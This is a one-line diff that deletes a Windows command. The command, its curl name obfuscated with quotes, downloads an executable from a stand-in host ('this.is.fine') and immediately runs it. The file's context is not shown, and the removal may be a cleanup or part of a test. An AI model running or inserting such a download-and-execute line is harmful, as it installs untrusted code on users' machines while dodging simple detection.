@@ -1,1 +1,0 @@
-"cu"rl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe
